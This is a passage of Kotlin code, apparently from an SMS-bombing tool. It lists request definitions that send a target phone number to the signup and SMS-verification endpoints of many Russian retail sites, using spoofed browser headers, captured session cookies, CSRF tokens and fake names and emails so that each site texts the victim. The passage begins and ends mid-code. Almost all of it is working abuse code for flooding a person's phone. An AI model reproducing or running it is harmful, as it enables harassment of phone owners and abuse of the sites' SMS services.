            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        json("{\"query\":\"mutation {\\n      registerUser(    input: {\\n      phone: \\\"$phone\\\",password: \\\"SBN_WTFchtotitutdelayesh$phone\\\"\\n    }) {\\n        uuid\\n      }\\n    }\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://glavnoehvost.ru/ajax/sms/signup/send"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("Accept", "*/*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "PHPSESSID=723e4b0193fnmvg3umh7rr3m6a; _csrf=cb4eb57c5c7c8c6063371d4e50e873df871286c8bdffd2d30ba0906714b649fda%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%224qQVr6AUSsWAglhkpQPPITBE0BJc5nte%22%3B%7D; _gcl_au=1.1.1093198136.1692872017; _ym_uid=1692872017940470630; _ym_d=1692872017; _ga=GA1.2.95164452.1692872017; _gid=GA1.2.263036329.1692872017; _gat_UA-19286257-3=1; _ym_isad=2; _ym_visorc=w; _ga_FV0VS6F4WT=GS1.2.1692872017.1.0.1692872032.45.0.0"
            )
            add("Origin", "https://glavnoehvost.ru")
            add("Referer", "https://glavnoehvost.ru/signup")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add(
                "X-CSRF-Token",
                "-oUJG1OfWWnHbRlVSEI4sqb4RYPwXCdD4XQaIHKAgcHO9FhNIakYPJQeThQvLlDZ1qkV07kIZQbRNlBDR-71pA=="
            )
            add("X-Requested-With", "XMLHttpRequest")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        formBody {
            add("phone", "$phone")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://kotmatros.ru/signup/"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "kotmatros.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; is_mobile=true; PHPSESSID=81sbm4vggbdq64mtvacu77tiel; landing=%2Fsignup%2F; cityselect__kladr_id=3300000500000; cityselect__fias_id=0d7d5d87-f0a6-428f-b655-d3be106c64a2; cityselect__constraints_street=3300000500000; cityselect__country=rus; cityselect__city=%D0%9C%D1%83%D1%80%D0%BE%D0%BC; cityselect__region=33; cityselect__zip=602205; dp_plugin_country=rus; dp_plugin_region=33; dp_plugin_city=%D0%9C%D1%83%D1%80%D0%BE%D0%BC; dp_plugin_zip=602205; _ym_uid=1692872230747454212; _ym_d=1692872230; roistat_visit=759122; roistat_first_visit=759122; roistat_visit_cookie_expire=1209600; cityselect__show_notifier=1692872230; _ym_isad=2; _ga_FKV2DT6X34=GS1.1.1692872229.1.0.1692872229.60.0.0; _ym_visorc=w; _ga_8Y0S4103FJ=GS1.1.1692872229.1.0.1692872229.60.0.0; _ga=GA1.2.439672442.1692872230; _gid=GA1.2.62218712.1692872230; _gat_gtag_UA_194791980_1=1; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit; mdp_uid=o6v0hxsyo; ___dc=1204f7a4-a9fe-4e99-a22a-e2cd5ed2741b"
            )
            add("origin", "https://kotmatros.ru")
            add("referer", "https://kotmatros.ru/signup/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("data[firstname]", "t$phone q")
            add("data[lastname]", "t$phone q")
            add("data[phone]", phone.format("+7 (***) ***-**-**"))
            add("wa_json_mode", "1")
            add("need_redirects", "1")
            add("contact_type", "person")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://superpet.ru/wp-admin/admin-ajax.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("Accept", "*/*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "_rc=b65eb680b9444170ad3f3b6dcc79e748; _ga_8VB1HQ0EW0=GS1.1.1692872391.1.0.1692872391.60.0.0; gtm-session-start=undefined; tmr_lvid=186b3273ebe86107ca1dc4dae3f424d0; tmr_lvidTS=1692872391827; _ga=GA1.2.2064954325.1692872392; _gid=GA1.2.1775227675.1692872392; _ga_cid=2064954325.1692872392; _gat=1; _ym_uid=1692872392715216592; _ym_d=1692872392; _ym_visorc=w; _ym_isad=2; first_visit=1; user_city=msc; handl_original_ref=https%3A%2F%2Fsuperpet.ru%2Fmy-account%2F; handl_landing_page=https%3A%2F%2Fsuperpet.ru%2F%3Fwc-ajax%3Dget_refreshed_fragments; handl_ip=176.53.43.44; handl_ref=https%3A%2F%2Fsuperpet.ru%2Fmy-account%2F; handl_url=https%3A%2F%2Fsuperpet.ru%2F%3Fwc-ajax%3Dget_refreshed_fragments; tmr_detect=0%7C1692872394966"
            )
            add("Origin", "https://superpet.ru")
            add("Referer", "https://superpet.ru/my-account/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("X-Requested-With", "XMLHttpRequest")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        formBody {
            add("action", "ajax_form_sms")
            add("tel", phone.format("8 (***) ***-****"))
            add("user_login_redirect", "0")
        }
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://izhevsk.khesflowers.ru/index.php") {
            addQueryParameter("route", "extension/module/sms_reg_khes/SmsCheck")
        }

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "izhevsk.khesflowers.ru")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "PHPSESSID=4ce56e0d9b037586d4d3734082b0f9f3; default=844817dadfaa99890fca624974fda95f; prmn_fias=3256; language=ru-ru; currency=RUB; sitecreator_hasWebP=1; _ga_XCJWRPXCDY=GS1.1.1692873486.1.0.1692873486.0.0.0; _ga=GA1.2.1939396617.1692873486; _gid=GA1.2.690739382.1692873486; _gat_UA-196378717-1=1; prmn_confirm=1; _ga_8ND8TB3BYH=GS1.2.1692873486.1.1.1692873486.60.0.0; _hjSessionUser_2693180=eyJpZCI6ImQyYzJhOGQ4LTUwNTktNWM4NS05NTY3LTBhODgxMThmMWI5MSIsImNyZWF0ZWQiOjE2OTI4NzM0ODY3NjQsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2693180=0; _hjSession_2693180=eyJpZCI6ImYwYzEzODJjLWE5MDgtNDc0ZS1iM2FjLTk0MmE2YzVhZmI5ZCIsImNyZWF0ZWQiOjE2OTI4NzM0ODY3NzAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; roistat_visit=924284; roistat_first_visit=924284; roistat_visit_cookie_expire=1209600; roistat_phone=%2B7%20(347)%20213-10-37%2C%2B7%20(843)%20212-61-80%2C%2B7%20(347)%20213-11-03%2C%2B7%20(499)%20113-56-59%2C%2B7%20(341)%20227-71-48%2C%2B7%20(855)%20291-09-23; roistat_call_tracking=1; roistat_phone_replacement=null; roistat_phone_script_data=%5B%7B%22phone%22%3A%22%2B7%20(347)%20213-10-37%22%2C%22css_selectors%22%3A%5B%5D%2C%22replaceable_numbers%22%3A%5B%2273472588374%22%2C%2273472588447%22%2C%2273472131037%22%5D%7D%2C%7B%22phone%22%3A%22%2B7%20(843)%20212-61-80%22%2C%22css_selectors%22%3A%5B%5D%2C%22replaceable_numbers%22%3A%5B%2278432126138%22%2C%2278432126033%22%2C%2278432126180%22%5D%7D%2C%7B%22phone%22%3A%22%2B7%20(347)%20213-11-03%22%2C%22css_selectors%22%3A%5B%5D%2C%22replaceable_numbers%22%3A%5B%2273472131144%22%5D%7D%2C%7B%22phone%22%3A%22%2B7%20(499)%20113-56-59%22%2C%22css_selectors%22%3A%5B%5D%2C%22replaceable_numbers%22%3A%5B%2274991135659%22%5D%7D%2C%7B%22phone%22%3A%22%2B7%20(341)%20227-71-48%22%2C%22css_selectors%22%3A%5B%5D%2C%22replaceable_numbers%22%3A%5B%2273412277563%22%2C%2273412277148%22%5D%7D%2C%7B%22phone%22%3A%22%2B7%20(855)%20291-09-23%22%2C%22css_selectors%22%3A%5B%5D%2C%22replaceable_numbers%22%3A%5B%2278552910209%22%5D%7D%5D; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_phone%2Croistat_call_tracking%2Croistat_phone_replacement%2Croistat_phone_script_data; ___dc=18278451-39b6-48a0-94fc-cae7a8a36c59; _ym_uid=1692873492843801851; _ym_d=1692873492; _ym_isad=2; _ym_visorc=w"
            )
            add("origin", "https://izhevsk.khesflowers.ru")
            add("referer", "https://izhevsk.khesflowers.ru/gifts/molochnyj-shokolad-dove")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("user_validation", "1")
            add("phone", phone.format("+7 (***) ***-**-**"))
        }
    },

    service {
        method = RequestBuilder.POST
        url = "https://may24.ru/api/web/security/token/get"

        json("{\"endpoint\":\"/api/web/auth/verifyPhone\"}")

        getJson { response ->
            method = RequestBuilder.POST
            url = "https://may24.ru/api/web/auth/verifyPhone"

            headers {
                add("Content-Type", "application/json")
                add("Accept", "application/json, text/plain, */*")
                add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
                add("Connection", "keep-alive")
                add(
                    "Cookie",
                    "_ga_YDPM511B98=GS1.1.1692873584.1.0.1692873584.0.0.0; _ga=GA1.1.1656479227.1692873585; _ym_uid=169287358598496288; _ym_d=1692873585; _ym_isad=2; _userGUID=0:llp182cz:IOacfz2Ug9B7vjr2fYJbtBAgL9G6UGCc; dSesn=c0323272-ce85-3148-a79f-b0a117373e6c; _dvs=0:llp182cz:GTk_EmarlrGWPnp8QZEaZibXE460xst0; __af=true; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; PHPSESSID=MYcvnUp2jKDbxlcNlSReSMmGuRKX4uYi; bxmaker.geoip.2.1.0_edited_location=1030; bxmaker.geoip.2.1.0_edited_city=%D0%9C%D1%83%D1%80%D0%BE%D0%BC; bxmaker.geoip.2.1.0_edited_city_id=1030; bxmaker.geoip.2.1.0_edited_country=%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F; bxmaker.geoip.2.1.0_edited_country_id=23064; bxmaker.geoip.2.1.0_edited_region=%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80%D1%81%D0%BA%D0%B0%D1%8F+%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C; bxmaker.geoip.2.1.0_edited_region_id=17; bxmaker.geoip.2.1.0_edited_zip=309257; bxmaker.geoip.2.1.0_edited_range=185.100.24.0+-+185.100.27.255; bxmaker.geoip.2.1.0_edited_lat=0.000000; bxmaker.geoip.2.1.0_edited_lng=0.000000; bxmaker.geoip.2.1.0_edited_yandex=0; bxmaker.geoip.2.1.0_edited_gar=0d7d5d87-f0a6-428f-b655-d3be106c64a2; BITRIX_SM_LOGIN=gewrgerg%40gmail.com; BITRIX_SM_UIDH=da709a49158d3244297072a3b59eb9fb; BITRIX_SM_UIDH=da709a49158d3244297072a3b59eb9fb; BITRIX_SM_UIDL=gewrgerg%40gmail.com; BITRIX_SM_SALE_UID=0; BITRIX_SM_SOUND_LOGIN_PLAYED=Y"
                )
                add("Origin", "https://may24.ru")
                add("Referer", "https://may24.ru/product/shokolad-molochnyy-alpen-gold-85-g/")
                add("Sec-Fetch-Dest", "empty")
                add("Sec-Fetch-Mode", "cors")
                add("Sec-Fetch-Site", "same-origin")
                add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
                add("sec-ch-ua-mobile", "?0")
                add("sec-ch-ua-platform", "\"Windows\"")
            }

            json(
                "{\"phone\":\"${phone.phone}\",\"phoneCode\":\"+${phone.countryCode}\",\"token\":\"${
                    response.jsonObject["data"]?.jsonObject?.get(
                        "token"
                    )?.jsonPrimitive?.content ?: ""
                }\"}"
            )
        }
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://wolkonsky.com/ajax/auth.php") {
            addQueryParameter("site", "s1")
        }

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "wolkonsky.com")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded;charset=UTF-8")
            add(
                "cookie",
                "PHPSESSID=8PtY1QSDfH5pcIxkHkS75VcM8i7r4T9U; BITRIX_SM_SALE_UID=53422248; BITRIX_SM_GUEST_ID=1456761; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1692910740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; tmr_lvid=67a8ab2b1ca81ac2554eda984610ead2; tmr_lvidTS=1692875173580; _ym_uid=1692875174693499215; _ym_isad=2; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; _gid=GA1.2.1104030062.1692875174; _gat_gtag_UA_176038543_2=1; _ym_visorc=w; CURRENT_CITY_ID=3; BITRIX_SM_LAST_VISIT=24.08.2023%2014%3A06%3A17; _ym_d=1692875178; _ga=GA1.2.1575819497.1692875174; _ga_7B3YHPTE6C=GS1.1.1692875174.1.1.1692875177.0.0.0; tmr_detect=0%7C1692875179934"
            )
            add("origin", "https://wolkonsky.com")
            add("referer", "https://wolkonsky.com/auth/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        formBody {
            add("sessid", "92b4a4326bc8f17ac6705630473e1b0b")
            add("action", "check_phone")
            add("phone", phone.format("+7 (***) ***-**-**"))
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://patisari.ru/php/profile.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "patisari.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "PHPSESSID=eue32o0r870ugj0a8h3l9bnbv7; _ym_uid=1692875268194606801; _ym_d=1692875268; _ym_isad=2; _ym_visorc=w; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D1%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fpatisari.ru%252F; mgo_uid=WE3UJnfN02oe0XbkEiW0; mgo_cnt=1; mgo_sid=nm6crzw6x111001cqpho"
            )
            add("origin", "https://patisari.ru")
            add("referer", "https://patisari.ru/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("phone", phone.format("+7 (***) ***-**-**"))
            add("mode", "phone")
            add("key", "7c5fed2572266227919e6dc7452a2498")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "http://pirotorg.ru/"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("Accept", "application/json, text/javascript, */*; q=0.01")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "PHPSESSID=HoCy49WMPnERpdFMKUbkgTj001ZMJI1J; BITRIX_SM_PK=desktop; BITRIX_SM_GUEST_ID=3382984; BITRIX_SM_LAST_VISIT=24.08.2023%2014%3A13%3A59; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A16%2C%22EXPIRE%22%3A1692910740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1692875640782017424; _ym_d=1692875640; _ym_isad=2; _ym_visorc=w; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462"
            )
            add("Origin", "http://pirotorg.ru")
            add("Referer", "http://pirotorg.ru/")
            add("X-Requested-With", "XMLHttpRequest")
        }

        formBody {
            add("component", "bxmaker.authuserphone.login")
            add("sessid", "a3e1e636ff199effc0ea0b579dd5bf11")
            add("method", "sendCode")
            add("phone", "+$phone")
            add("registration", "Y")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://jf-pyro.ru/ajax/regsms.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "jf-pyro.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "PHPSESSID=hMiiefnEOJ3fooMOSO3zRloXCTTVsinU; BITRIX_SM_SALE_UID=85590e527cc74e0dc5ac7d3f8e8d01e3; _ym_uid=1692875782877601467; _ym_d=1692875782; _ga=GA1.2.837917989.1692875782; _gid=GA1.2.713808854.1692875782; _gat_gtag_UA_199862379_2=1; _ym_isad=2; _ym_visorc=w"
            )
            add("origin", "https://jf-pyro.ru")
            add("referer", "https://jf-pyro.ru/auth/registration/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("phone", phone.format("+7(***)***-**-**"))
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://proxy.divan.ru/backend/cabinet/formes/register"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "proxy.divan.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "multipart/form-data; boundary=----WebKitFormBoundarycv9RG2XAYwff7Vgl")
            add(
                "cookie",
                "rgn=1; secondary_rgn=1; _SESS_ID=baub8mcvc46qopq6bh4b8n2098; floddss=typein; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-08-24%2014%3A21%3A23%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.divan.ru%2Fcategory%2Fkrovati-dvuspalnye%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-08-24%2014%3A21%3A23%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.divan.ru%2Fcategory%2Fkrovati-dvuspalnye%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Safari%2F537.36%20Edg%2F116.0.1938.54; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.divan.ru%2Fcategory%2Fkrovati-dvuspalnye; tmr_lvid=0d39c7f96a059bf3ab5a2efd15c86640; tmr_lvidTS=1692876083556; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; _ym_uid=1692876084583449756; _ym_d=1692876084; _hjSessionUser_2449056=eyJpZCI6IjY4ODAwZTgyLTJkYjctNTU4MC05NzA0LTU3YzAxMDI2Mzk0OSIsImNyZWF0ZWQiOjE2OTI4NzYwODM5MjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2449056=0; _hjSession_2449056=eyJpZCI6IjRlZjE1ZGU1LTU1YjctNDUxNC05NDc3LTUyNjk0ZGZkMWMzYyIsImNyZWF0ZWQiOjE2OTI4NzYwODM5MzAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ym_isad=2; _ym_visorc=b; _ga=GA1.2.1414361792.1692876083; _gid=GA1.2.447491001.1692876084; call_s=%3C\u0021%3E%7B%2280142c76%22%3A%5B1692877884%2C3077113224%2C%7B%22308152%22%3A%22894400%22%7D%5D%2C%22d%22%3A2%7D%3C\u0021%3E; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ga_G2KY72B9GB=GS1.1.1692876083.1.1.1692876129.14.0.0"
            )
            add("origin", "https://www.divan.ru")
            add("referer", "https://www.divan.ru/category/krovati-dvuspalnye")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-site")
            add("x-requested-with", "XMLHttpRequest")
        }

        body =
            "$------WebKitFormBoundarycv9RG2XAYwff7Vgl\r\nContent-Disposition: form-data; name=\"pointOfContact\"\r\n\r\nOther\r\n------WebKitFormBoundarycv9RG2XAYwff7Vgl\r\nContent-Disposition: form-data; name=\"country\"\r\n\r\nRUS\r\n------WebKitFormBoundarycv9RG2XAYwff7Vgl\r\nContent-Disposition: form-data; name=\"firstName\"\r\n\r\nуекпепуек\r\n------WebKitFormBoundarycv9RG2XAYwff7Vgl\r\nContent-Disposition: form-data; name=\"lastName\"\r\n\r\nпкуеупекп\r\n------WebKitFormBoundarycv9RG2XAYwff7Vgl\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n${
                phone.format("+7 (***) ***-**-**")
            }\r\n------WebKitFormBoundarycv9RG2XAYwff7Vgl\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nriregeh@gmail.com\r\n------WebKitFormBoundarycv9RG2XAYwff7Vgl\r\nContent-Disposition: form-data; name=\"promoCode\"\r\n\r\n\r\n------WebKitFormBoundarycv9RG2XAYwff7Vgl\r\nContent-Disposition: form-data; name=\"resendCode\"\r\n\r\nfalse\r\n------WebKitFormBoundarycv9RG2XAYwff7Vgl--\r\n".toRequestBody(
                "multipart/form-data; boundary=----WebKitFormBoundarycv9RG2XAYwff7Vgl".toMediaType()
            )
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://xn--80ahmfifks.xn--p1ai/plugin/SMSmodule/one_send.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("Accept", "*/*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "PHPSESSID=tl37ed7a7cdkkikgviuqdcvst7; _ga_CGDXGWMPL4=GS1.1.1692876397.1.0.1692876397.60.0.0; tmr_lvid=e4992ba9d64a50ea9898d2ea6e7a12b6; tmr_lvidTS=1692876397496; _ga=GA1.2.960481765.1692876397; _gid=GA1.2.2092971297.1692876398; _gat_gtag_UA_137510236_1=1; _ym_uid=1692876398996356094; _ym_d=1692876398; _ym_isad=2; _ym_visorc=w; ztracker=7155%3Ano_source; tmr_detect=0%7C1692876400064"
            )
            add("Origin", "https://xn--80ahmfifks.xn--p1ai")
            add("Referer", "https://xn--80ahmfifks.xn--p1ai/account/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("X-Requested-With", "XMLHttpRequest")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        formBody {
            add("variant", "1")
            add("Pass", "PasNew")
            add("Phone", phone.toString())
        }
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://dom-a-dom.ru/bitrix/services/main/ajax.php") {
            addQueryParameter("action", "stratosfera:eshop.api.auth.sendCode")
        }

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("Accept", "*/*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Bx-ajax", "true")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "BITRIX_SM_GUEST_ID=2341849; BITRIX_SM_LAST_VISIT=24.08.2023%2016%3A40%3A07; BITRIX_SM_SALE_UID=18325277; PHPSESSID=XUk0llLoSuroNIUDcNWawfvmQF5OX4Wx; _ym_uid=1692877207694654051; _userGUID=0:llp3dp6m:zNTdRTltHcTXl1T7q85FWGKBQ3dMKmoF; dSesn=f4751766-3330-66d8-dc9e-7c961a93c7d3; _dvs=0:llp3dp6m:ke74f7iXXXTNDlxhrAxxwRNdPLl9ER8T; digi_uc=W1siY3YiLCIxNzg5ODAiLDE2OTI4NzcyMDc1MjNdXQ==; _gcl_au=1.1.282918573.1692877208; _ym_d=1692877208; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; roistat_visit=700722; roistat_first_visit=700722; roistat_visit_cookie_expire=1209600; _ym_isad=2; _ym_visorc=w; tmr_lvid=f00594120251ac2af17e78a1437064c2; tmr_lvidTS=1692877207793; _ga=GA1.2.589085903.1692877208; _gid=GA1.2.2128070937.1692877208; _clck=ftuoyy|2|fef|0|1331; _ga_DH3BT68VJ1=GS1.2.1692877208.1.0.1692877208.60.0.0; leadhunter_expire=1; _clsk=1gjv1tt|1692877208271|1|1|www.clarity.ms/eus-f-sc/collect; ___dc=86e3d895-ab35-41cb-a2c3-10749bdcdc91; tmr_detect=0%7C1692877210277; _ga_5K6CS6S2MZ=GS1.1.1692877207.1.0.1692877318.0.0.0; roistat_leadHunterCaught=1; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Cleadhunter_expire%2Croistat_leadHunterCaught"
            )
            add("Origin", "https://dom-a-dom.ru")
            add("Referer", "https://dom-a-dom.ru/catalog/mebel_dlya_spalni/krovati_2/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("X-Bitrix-Csrf-Token", "a5be846f2ca5e0eae5be4bfc79e33064")
            add("X-Bitrix-Site-Id", "s1")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        formBody {
